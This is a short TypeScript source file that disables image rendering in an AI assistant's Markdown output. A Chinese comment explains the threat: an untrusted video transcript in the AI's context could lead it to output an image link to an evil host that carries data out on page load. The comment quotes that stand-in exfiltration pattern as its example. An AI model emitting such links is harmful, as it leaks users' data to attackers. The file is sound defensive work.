/**
 * AI 回复的 Markdown 渲染配置。
 *
 * 图片一律不渲染。AI 的上下文里有这个视频的转写文本，而转写文本是不可信的（视频里的
 * 人说什么都行）。Markdown 图片 `![x](https://evil/?d=…)` 一旦渲染成 `<img>`，浏览器会
 * 自动请求那个地址，数据就被带出去了，用户甚至不用点任何东西。
 * streamdown 默认 `allowedImagePrefixes: ["*"]`，所以要在这里显式拦掉。
 * 助手本来也没有需要展示图片的场景。
 *
 * 链接不用拦：streamdown 默认只在点击后才打开，不会自动发请求；脚本、`onerror`、
 * `javascript:` 也已被它的白名单过滤（见 scripts/test-markdown.mjs 的实测）。
 */
import type { ComponentProps } from 'react';
import type { Streamdown } from 'streamdown';

export const SAFE_COMPONENTS: NonNullable<ComponentProps<typeof Streamdown>['components']> = {
  img: () => null,
};
